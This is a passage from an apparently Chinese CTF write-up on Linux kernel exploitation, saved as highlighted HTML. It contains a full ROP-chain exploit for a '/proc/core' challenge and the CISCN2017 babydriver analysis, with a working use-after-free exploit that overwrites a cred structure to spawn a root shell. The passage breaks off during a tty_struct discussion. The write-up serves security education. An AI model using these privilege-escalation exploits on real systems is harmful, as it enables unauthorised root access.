class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81000b2f</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDX_RET 0xffffffff810a0f49</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RCX_RET 0xffffffff81021e53</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_POPFQ_RET 0xffffffff81a012da</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>  IRETQ 0xffffffff813eb448</span><br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-type">void</span> *) = prepare_kernel_cred;<br>    <span class="hljs-built_in">int</span> (*commit_creds_ptr)(<span class="hljs-type">void</span> *) = commit_creds;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;   <br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">getuid</span>())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">coreRead</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">ioctl</span>(fd, <span class="hljs-number">0x6677889B</span>, buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setOffValue</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> off)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">ioctl</span>(fd, <span class="hljs-number">0x6677889C</span>, off);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">coreCopyFunc</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> nbytes)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">ioctl</span>(fd, <span class="hljs-number">0x6677889A</span>, nbytes);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);<br>    <span class="hljs-built_in">saveStatus</span>();<br><br>    <span class="hljs-type">int</span> fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/core&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd &lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the file: /proc/core !\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//get the addr</span><br>    FILE* sym_table_fd = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(sym_table_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x50</span>], type[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">size_t</span> addr;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(sym_table_fd, <span class="hljs-string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            commit_creds = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            prepare_kernel_cred = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">size_t</span> offset = commit_creds - <span class="hljs-number">0xffffffff8109c8e0</span>;<br><br>    <span class="hljs-comment">// get the canary</span><br>    <span class="hljs-type">size_t</span> canary;<br>    <span class="hljs-built_in">setOffValue</span>(fd, <span class="hljs-number">64</span>);<br>    <span class="hljs-built_in">coreRead</span>(fd, buf);<br>    canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-comment">//construct the ropchain</span><br>    <span class="hljs-type">size_t</span> rop_chain[<span class="hljs-number">0x100</span>], i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(; i &lt; <span class="hljs-number">10</span>;i++)<br>        rop_chain[i] = canary;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)getRootPrivilige;<br>    rop_chain[i++] = SWAPGS_POPFQ_RET + offset;<br>    rop_chain[i++] = <span class="hljs-number">0</span>;<br>    rop_chain[i++] = IRETQ + offset;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)getRootShell;<br>    rop_chain[i++] = user_cs;<br>    rop_chain[i++] = user_rflags;<br>    rop_chain[i++] = user_sp;<br>    rop_chain[i++] = user_ss;<br><br>    <span class="hljs-built_in">write</span>(fd, rop_chain, <span class="hljs-number">0x800</span>);<br>    <span class="hljs-built_in">coreCopyFunc</span>(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="babydriver"><a href="#babydriver" class="headerlink" title="babydriver"></a>babydriver</h2><p>题目链接：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel/CISCN2017-babydriver">CISCN2017-babydriver</a></p><p>题目解压出来后，发现没有vmlinux文件，可以用上面提到的方法来提取。</p><p>还是先看看boot.sh这个脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append <span class="hljs-string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;</span> -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep<br><br></code></pre></td></tr></table></figure><p>开启了SEMP保护，没有KASLR。</p><p>解压rootfs.cpio后看看init：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br> <br>mount -t proc none /proc<br>mount -t sysfs none /sys<br>mount -t devtmpfs devtmpfs /dev <br><span class="hljs-built_in">chown</span> root:root flag  <span class="hljs-comment">#设置文件flag的所有者为root用户和组。</span><br><span class="hljs-built_in">chmod</span> 400 flag  <span class="hljs-comment">#限制flag文件仅允许root用户读取，其他用户无权限。</span><br><span class="hljs-built_in">exec</span> 0&lt;/dev/console<br><span class="hljs-built_in">exec</span> 1&gt;/dev/console<br><span class="hljs-built_in">exec</span> 2&gt;/dev/console<br><br>insmod /lib/modules/4.4.72/babydriver.ko<br><span class="hljs-built_in">chmod</span> 777 /dev/babydev<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\nBoot took <span class="hljs-subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span><br>setsid cttyhack setuidgid 1000 sh<br><br>umount /proc<br>umount /sys<br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure><p>加载了一个叫babydriver.ko的驱动，漏洞一般就在这里。</p><p>checksec一下：只开了NX</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>       <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>        <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x0)</span><br>    <span class="hljs-attr">Stripped:</span>   <span class="hljs-literal">No</span><br>    <span class="hljs-attr">Debuginfo:</span>  <span class="hljs-literal">Yes</span><br></code></pre></td></tr></table></figure><p>拖进ida分析，</p><ul><li><p>首先是babydriver_init函数：初始化了&#x2F;dev&#x2F;babydev，在fop里定义了几个回调函数。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs smali">int __cdecl babydriver_init()<br>&#123;<br>  __int64 v0; // rdx<br> <span class="hljs-built_in"> int </span>v1; // edx<br>  __int64 v2; // rsi<br>  __int64 v3; // rdx<br> <span class="hljs-built_in"> int </span>v4; // ebx<br>  class *v5; // rax<br>  __int64 v6; // rdx<br>  __int64 v7; // rax<br><br> <span class="hljs-built_in"> if </span>( (int)alloc_chrdev_region(&amp;babydev_no, 0LL, 1LL, <span class="hljs-string">&quot;babydev&quot;</span>) &gt;= 0 )<br>  &#123;<br>    cdev_init(&amp;cdev_0, &amp;fops);<br>    v2 = babydev_no;<br>    cdev_0.owner = &amp;_this_module;<br>    v4 = cdev_add(&amp;cdev_0, babydev_no, 1<span class="hljs-class">LL);</span><br>   <span class="hljs-built_in"> if </span>( v4 &gt;= 0 )<br>    &#123;<br>      v5 = (class *)_class_create(&amp;_this_module, <span class="hljs-string">&quot;babydev&quot;</span>, &amp;babydev_no);<br>      babydev_class = v5;<br>     <span class="hljs-built_in"> if </span>( v5 )<br>      &#123;<br>        v7 = device_create(v5, 0<span class="hljs-class">LL, babydev_no, 0LL, &quot;babydev&quot;);</span><br>        v1 = 0;<br>       <span class="hljs-built_in"> if </span>( v7 )<br>         <span class="hljs-built_in"> return </span>v1;<br>        printk(&amp;unk_351, 0<span class="hljs-class">LL, 0LL);</span><br>        class_destroy(babydev_class);<br>      &#125;<br>      else<br>      &#123;<br>        printk(&amp;unk_33B, <span class="hljs-string">&quot;babydev&quot;</span>, v6);<br>      &#125;<br>      cdev_del(&amp;cdev_0);<br>    &#125;<br>    else<br>    &#123;<br>      printk(&amp;unk_327, v2, v3);<br>    &#125;<br>    unregister_chrdev_region(babydev_no, 1<span class="hljs-class">LL);</span><br>   <span class="hljs-built_in"> return </span>v4;<br>  &#125;<br>  printk(&amp;unk_309, 0<span class="hljs-class">LL, v0);</span><br> <span class="hljs-built_in"> return </span>1;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>babyopen函数：在我们使用open打开设备文件时，会分配一个0x40大小的chunk，并将该chunk的指针存在全局变量babydev_struct.device_buf中。</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs wren">int <span class="hljs-variable">__fastcall</span> <span class="hljs-title function_">babyopen</span>(<span class="hljs-params">inode</span> *<span class="hljs-params">inode</span>, <span class="hljs-params">file</span> *<span class="hljs-params">filp</span>)<br>&#123;<br>  <span class="hljs-variable">__int64</span> <span class="hljs-variable">v2</span>; <span class="hljs-comment">// rdx</span><br><br>  <span class="hljs-variable">_fentry__</span>(inode, <span class="hljs-variable">filp</span>);<br>  <span class="hljs-variable">babydev_struct</span>.<span class="hljs-property">device_buf</span> <span class="hljs-operator">=</span> (<span class="hljs-variable">char</span> <span class="hljs-operator">*</span>)<span class="hljs-title function_">kmem_cache_alloc_trace</span>(<span class="hljs-variable">kmalloc_caches</span>[<span class="hljs-number">6</span>], <span class="hljs-number">37748928</span>LL, <span class="hljs-number">64</span>LL);<br>  <span class="hljs-variable">babydev_struct</span>.<span class="hljs-property">device_buf_len</span> <span class="hljs-operator">=</span> <span class="hljs-number">64</span>LL;<br>  <span class="hljs-title function_">printk</span>(<span class="hljs-string">&quot;device open<span class="hljs-char escape_">\n</span>&quot;</span>, <span class="hljs-number">37748928</span>LL, <span class="hljs-variable">v2</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>babyrelease函数：在使用close(fd)时调用该函数，释放babydev_struct.device_buf指向的chunk，但是未将指针置NULL，存在UAF。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss"> int __fastcall <span class="hljs-built_in">babyrelease</span>(inode *inode, file *filp)<br>&#123;<br>  __int64 v2; <span class="hljs-comment">// rdx</span><br><br>  <span class="hljs-built_in">_fentry__</span>(inode, filp);<br>  <span class="hljs-built_in">kfree</span>(babydev_struct.device_buf);<br>  <span class="hljs-built_in">printk</span>(&quot;device release\n&quot;, filp, v2);<br>  return <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>babyioctl函数：只有一个功能，当command&#x3D;0x10001时，先free掉babydev_struct.device_buf指向的chunk，然后可以申请任意大小的堆块。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">babyioctl</span><span class="hljs-params">(file *filp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> command, <span class="hljs-type">unsigned</span> __int64 arg)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">size_t</span> v3; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">size_t</span> v4; <span class="hljs-comment">// rbx</span><br>  __int64 v5; <span class="hljs-comment">// rdx</span><br><br>  _fentry__(filp, *&amp;command, arg);<br>  v4 = v3;<br>  <span class="hljs-keyword">if</span> ( command == <span class="hljs-number">0x10001</span> )<br>  &#123;<br>    <span class="hljs-built_in">kfree</span>(babydev_struct.device_buf);<br>    babydev_struct.device_buf = _kmalloc(v4, <span class="hljs-number">0x24000C0</span>LL);<br>    babydev_struct.device_buf_len = v4;<br>    <span class="hljs-built_in">printk</span>(<span class="hljs-string">&quot;alloc done\n&quot;</span>, <span class="hljs-number">0x24000C0</span>LL, v5);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printk</span>(&amp;unk_2EB, v3, v3);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-22LL</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>babywrite和babyread函数就是正常的读写chunk，这里就不提了。</p></li></ul><p>由上面的逆向分析可以发现，本题的漏洞是一个伪条件竞争的UAF漏洞，即：如果我们同时使用open打开两个设备，由于 babydev_struct.device_buf是一个全局变量，第二次会将第一次分配的空间给覆盖了。此时如果我们释放第一个，那么实际上就会将第二个给释放了，造成了UAF。</p><blockquote><p>关于这里为什么要打开两个设备，不能只在一个设备里完成UAF，是因为：babyrelease这个函数并不是一个FOP定义的回调函数，我们不能使用。这个函数只会在close(fd)时自动调用，但是close后我们就不能再操作这个设备了。所以这里要用两个设备来构造UAF。</p></blockquote><p>知道如何得到UAF，接下来就该想想怎么提权了，这里介绍两种方法：</p><h3 id="改cred结构体"><a href="#改cred结构体" class="headerlink" title="改cred结构体"></a>改cred结构体</h3><p>这种方法的利用思路是，利用ioctl调整一个chunk的大小为一个cred结构体的大小（0xa8），然后关闭该设备，再fork()出一个新进程，那么刚才被释放的chunk就会被分配做新进程的cred结构体，而我们此时还有另一个设备可以操控该chunk，这时只需将该cred结构体中的euid改为0（root）即可完成提权。</p><p>exp：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]Start to exploit...\n&quot;</span>);<br><br><span class="hljs-type">int</span> fd1 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/babydev&quot;</span>,<span class="hljs-number">2</span>);<br><span class="hljs-type">int</span> fd2 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/babydev&quot;</span>,<span class="hljs-number">2</span>);<br><br><span class="hljs-built_in">ioctl</span>(fd1,<span class="hljs-number">0x10001</span>,<span class="hljs-number">0xa8</span>); <span class="hljs-comment">//修改为cred结构体大小的chunk</span><br><span class="hljs-built_in">close</span>(fd1);  <span class="hljs-comment">//得到垂悬指针</span><br><br><span class="hljs-type">int</span> pid = fork();<br><br><span class="hljs-keyword">if</span>(pid &lt; <span class="hljs-number">0</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Unable to fork the new thread, exploit failed.\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)&#123;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">30</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-built_in">write</span>(fd2,buf,<span class="hljs-number">28</span>); <span class="hljs-comment">//修改cred结构体</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">getuid</span>() == <span class="hljs-number">0</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successful to get the root. Execve root shell now...\n&quot;</span>);<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Unable to get the root, exploit failed.\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-built_in">wait</span>(<span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="改tty结构体"><a href="#改tty结构体" class="headerlink" title="改tty结构体"></a>改tty结构体</h3><p>上面改cred结构体的方法很简单，但是上述是在kernel版本为4.4.72的情况下进行操作的，在kernel版本为4.5之后出现了一点变化，让我们看看源码：</p><ul><li>4.4.72<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">void</span> __<span class="hljs-function"><span class="hljs-keyword">init</span> <span class="hljs-title">cred_init</span>(<span class="hljs-params"><span class="hljs-keyword">void</span></span>)</span><br>&#123;<br>    <span class="hljs-comment">/* allocate a slab in which we can store credentials */</span><br>    cred_jar = kmem_cache_create(<span class="hljs-string">&quot;cred_jar&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> cred),<br>                     <span class="hljs-number">0</span>, SLAB_HWCACHE_ALIGN|SLAB_PANIC, NULL);<br>&#125;<br></code></pre></td></tr></table></figure></li><li>4.5<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">void</span> __<span class="hljs-function"><span class="hljs-keyword">init</span> <span class="hljs-title">cred_init</span>(<span class="hljs-params"><span class="hljs-keyword">void</span></span>)</span><br>&#123;<br>    <span class="hljs-comment">/* allocate a slab in which we can store credentials */</span><br>    cred_jar = kmem_cache_create(<span class="hljs-string">&quot;cred_jar&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> cred), <span class="hljs-number">0</span>,<br>            SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, NULL);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>注意到，在4.5中添加了一个<strong>SLAB_ACCOUNT</strong>标志位，我们知道内核中的 slab 分配器有一个优化机制，会将属性完全一致的缓存合并，以便复用同一套内存管理逻辑。例如，如果没有<strong>SLAB_ACCOUNT</strong>标志，cred_jar 创建出来的 slab 缓存与 kmalloc 用于分配 192 字节对象的缓存（通常称为 kmalloc-192）属性一致，那么这两者就会合并在一起。</p><p>当在创建 cred_jar 时额外加上了 SLAB_ACCOUNT 标志，这就改变了 cred_jar 的属性。内核会认为它与 kmalloc-192 的缓存不再相同，从而不会进行合并。</p><p>结果就是，如果通过 kmalloc 分配 192 字节的内存，内核不会去使用 cred_jar 中的对象，而是使用 kmalloc-192 自己的缓存。这就要求如果想使用 cred_jar，必须通过直接调用 kmem_cache_alloc(cred_jar, …) 来分配对象，而不能通过 kmalloc 来间接分配。</p><p>也就是说，第一种方法从此失效了，我们必须寻找另外的方法来提权。</p><p>我们这里选用tty设备。</p><p>有关这个设备的介绍，，我们只在这里简要介绍了，详细的知识可以看这几篇文章：<br><a href="https://blog.csdn.net/liangzc1124/article/details/127469767">一文彻底讲清Linux tty子系统架构及编程实例</a><br><a href="https://blog.csdn.net/qq_45323960/article/details/130912716">linux kernel pwn 常用结构体</a></p><p>当用户执行<strong>open(“&#x2F;dev&#x2F;ptmx”, O_RDWR)<strong>，kernel会分配一个</strong>tty_struct</strong>结构体（本题版本该结构体大小为0x2e0）。</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">struct</span> <span class="hljs-type">tty_struct</span> &#123;<br>intmagic;<br><span class="hljs-keyword">struct</span> 